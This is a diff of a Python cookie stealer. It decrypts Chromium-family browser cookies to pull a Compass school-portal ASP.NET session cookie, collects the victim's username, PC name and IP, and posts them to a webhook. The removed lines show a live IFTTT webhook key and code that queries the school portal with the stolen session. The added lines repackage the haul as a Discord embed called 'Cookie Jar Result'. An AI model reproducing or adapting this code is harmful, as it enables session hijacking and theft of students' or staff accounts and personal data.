@@ -15,7 +15,6 @@ from shutil import copyfile
 from Cryptodome.Cipher import AES
 from win32crypt import CryptUnprotectData
 
-
 def getCookie(path):
 
 	# Copy Cookies to tmp folder
@@ -48,18 +47,7 @@ def getCookie(path):
 	conn.close()
 
 	# add netkey to netKeys
-	return str("ASP.NET_SessionId"+decrypted_value.decode("utf-8"))
-
-def getUsrInfo(netCookie):
-	# Compass API for user data
-	usrHeaders = {
-		'Cookie': netCookie,
-		'Content-Type': 'application/json'
-	}
-	usrURL = 'https://mullauna-vic.compass.education/'
-	usrResponse = requests.post(usrURL, headers=usrHeaders)
-
-	return json.loads(usrResponse.text)
+	return str("ASP.NET_SessionId="+decrypted_value.decode("utf-8"))
 
 def getSysInfo():
 	# Get username, pc name, IP
@@ -71,8 +59,8 @@ def getSysInfo():
 
 def postData(data):
 	# Send data to backend webhook
-	postUrl = "https://maker.ifttt.com/trigger/cuck/json/with/key/15c8yZ8uW7vFMs-Wfvi17SrNF7db4z3RoerjK2ja19"
-	requests.post(url=postUrl,json=data)
+	postUrl = ""
+	requests.post(postUrl,json=data)
 
 paths = [
 	# Paths for Chrome, Brave, Edge
@@ -99,24 +87,29 @@ for path in paths:
 sysInfo = getSysInfo()
 
 embed = {
-	"fields":[
-		{
-			"name":"ASP.NET",
-			"value":netCookies[0],
-		},
-		{
-			"name":"Username",
-			"value":sysInfo[0]
-		},
-		{
-			"name":"PC Name",
-			"value":sysInfo[1]
-		},
-		{
-			"name":"IP",
-			"value":sysInfo[2]
-		},
-	],
+	"username":"CookieJar",
+	"avatar_url":"https://cdn.discordapp.com/attachments/823027129133432863/1032164219933691964/cookie.png",
+	"title":"Cookie Jar Result",
+	"embeds": [{
+		"fields":[
+			{
+				"name":"Compass Session Cookie",
+				"value":netCookies[0],
+			},
+			{
+				"name":"Username",
+				"value":sysInfo[0]
+			},
+			{
+				"name":"PC Name",
+				"value":sysInfo[1]
+			},
+			{
+				"name":"IP",
+				"value":sysInfo[2]
+			},
+		],
+	}]
 }
 
 postData(embed)
